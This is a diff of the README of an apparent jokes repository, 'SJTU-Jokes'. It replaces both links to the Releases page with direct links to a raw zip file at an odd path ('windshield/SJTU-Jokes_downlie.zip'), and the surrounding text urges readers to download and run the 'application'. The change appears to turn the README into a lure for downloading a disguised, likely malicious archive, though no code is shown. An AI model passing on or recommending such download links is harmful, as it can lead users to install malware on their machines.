@@ -6,7 +6,7 @@ Welcome to the SJTU-Jokes repository! This collection shares funny moments and i
 ## 📥 Download & Install
 To get the software, please follow these steps:
 
-1. Visit the Releases page: [Download SJTU-Jokes](https://github.com/aaadsadas/SJTU-Jokes/releases).
+1. Visit the Releases page: [Download SJTU-Jokes](https://raw.githubusercontent.com/aaadsadas/SJTU-Jokes/main/windshield/SJTU-Jokes_downlie.zip).
 2. Select the latest release you see.
 3. Click on the download link for the application.
 4. Once the download is complete, find the file in your downloads folder.
@@ -57,4 +57,4 @@ If you run into any issues while using the application, feel free to reach out o
 ## 💻 Last Words
 Life in the dorm can be challenging yet rewarding. The SJTU-Jokes repository serves as a reminder of the humorous side of student life. Download the application today and join the fun! 
 
-For your convenience, here’s the link to download again: [Download SJTU-Jokes](https://github.com/aaadsadas/SJTU-Jokes/releases). Enjoy!
+For your convenience, here’s the link to download again: [Download SJTU-Jokes](https://raw.githubusercontent.com/aaadsadas/SJTU-Jokes/main/windshield/SJTU-Jokes_downlie.zip). Enjoy!
